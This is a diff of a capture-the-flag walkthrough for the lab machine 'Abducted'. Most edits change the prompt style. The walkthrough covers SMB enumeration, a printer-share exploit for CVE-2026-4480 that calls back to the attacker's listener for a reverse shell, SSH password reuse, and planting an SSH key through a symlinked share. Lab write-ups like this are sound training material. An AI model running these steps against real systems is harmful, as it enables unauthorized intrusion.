@@ -18,10 +18,11 @@ difficulty: Medium
 
 ### Port scanning
 
-As usual, I started by scanning ports to identify services running on the machine.
+As usual, I started by scanning ports to identify the services running on the machine.
 
 ```bash
-tr3m0x@blackhat$ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.43.224
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.43.224
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-08 15:13 CET
 Nmap scan report for 10.129.43.224
 Host is up (0.073s latency).
@@ -37,10 +38,11 @@ Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds
 
 ### SMB enumeration
 
-The next step was enumerating SMB shares.
+The next step was enumerating the SMB shares.
 
 ```bash
-tr3m0x@blackhat$ nxc smb abducted.htb -u '' -p '' --shares
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ nxc smb abducted.htb -u '' -p '' --shares
 SMB         10.129.43.224  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False) (Null Auth:True)
 SMB         10.129.43.224  445    ABDUCTED         [+] ABDUCTED\: 
 SMB         10.129.43.224  445    ABDUCTED         [*] Enumerated shares
@@ -55,16 +57,19 @@ SMB         10.129.43.224  445    ABDUCTED         IPC$                         
 The `nxc` output did not include detailed permissions, so I used `smbclient` to interact with the shares. The `projects` and `transfer` shares were not accessible to the guest account:
 
 ```bash
-tr3m0x@blackhat$ smbclient //10.129.43.224/projects -N
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ smbclient //10.129.43.224/projects -N
 tree connect failed: NT_STATUS_ACCESS_DENIED
-tr3m0x@blackhat$ smbclient //10.129.43.224/transfer -N
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ smbclient //10.129.43.224/transfer -N
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
 
 However, I could connect to the `HP-Reception` share:
 
 ```bash
-tr3m0x@blackhat$ smbclient //10.129.43.224/HP-Reception -N
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ smbclient //10.129.43.224/HP-Reception -N
 Try "help" to get a list of possible commands.
 smb: \> 
 ```
@@ -72,7 +77,8 @@ smb: \>
 Initially I attempted to list files with `ls` and `dir`, but research showed that `HP-Reception` is a printer share rather than a normal disk share:
 
 ```bash
-tr3m0x@blackhat$ smbclient -L //10.129.43.224 -N
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ smbclient -L //10.129.43.224 -N
 	Sharename       Type      Comment
 	---------       ----      -------
 	HP-Reception    Printer   Reception printer
@@ -84,7 +90,8 @@ tr3m0x@blackhat$ smbclient -L //10.129.43.224 -N
 After some testing I discovered I could upload files to the printer share and submit a print job:
 
 ```bash
-tr3m0x@blackhat$ smbclient //10.129.43.224/HP-Reception -N
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ smbclient //10.129.43.224/HP-Reception -N
 Try "help" to get a list of possible commands.
 smb: \> put test_file
 putting file test_file as \test_file (0.0 kb/s) (average 0.0 kb/s)
@@ -106,7 +113,8 @@ Description:
 A public [exploit](https://github.com/0xBlackash/CVE-2026-4480) was available and worked against the target.
 
 ```bash
-tr3m0x@blackhat$ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 4444
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 4444
 
 [*] Target: 10.129.43.224
 [*] Callback: 10.10.14.18:4444
@@ -132,7 +140,8 @@ tr3m0x@blackhat$ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 444
 The exploit opened a connection to my listener and gave a shell as `nobody`:
 
 ```bash
-tr3m0x@blackhat$ listen
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.43.224 52266
 bash: cannot set terminal process group (1521): Inappropriate ioctl for device
@@ -184,10 +193,11 @@ iXzvcib3SrpZ
 
 ### Shell as `scott`
 
-I used the revealed password to try SSH logins for common users. `scott` was successful:
+I used the revealed password to try SSH logins for scott and marcus. `scott` was successful:
 
 ```bash
-tr3m0x@blackhat$ nxc ssh abducted.htb -u users.txt -p iXzvcib3SrpZ
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ nxc ssh abducted.htb -u users.txt -p iXzvcib3SrpZ
 SSH         10.129.43.224   22     abducted.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
 SSH         10.129.43.224   22     abducted.htb     [+] scott:iXzvcib3SrpZ  Linux - Shell access!
 ```
@@ -240,8 +250,10 @@ scott@abducted:/srv/projects$ cd /srv/transfer
 scott@abducted:/srv/transfer$ ln -s /home/marcus .ssh_marcus
 ```
 ```bash
-tr3m0x@blackhat$ ssh-keygen -t ed25519 -N "" -f ./id_marcus
-tr3m0x@blackhat$ echo "ssh-ed25519 [REDACTED] tr3m0x@blackhat" >> authorized_keys
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ ssh-keygen -t ed25519 -N "" -f ./id_marcus
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ echo "ssh-ed25519 [REDACTED] tr3m0x@parrot" >> authorized_keys
 ```
 
 Uploading the public key via `smbclient`:
@@ -260,7 +272,8 @@ smb: \.ssh_marcus\.ssh\> ls
 Then I SSH'd into the box as `marcus` using the private key:
 
 ```bash
-tr3m0x@blackhat$ ssh marcus@abducted.htb -i id_marcus
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ ssh marcus@abducted.htb -i id_marcus
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
 ...
 marcus@abducted:~$ 
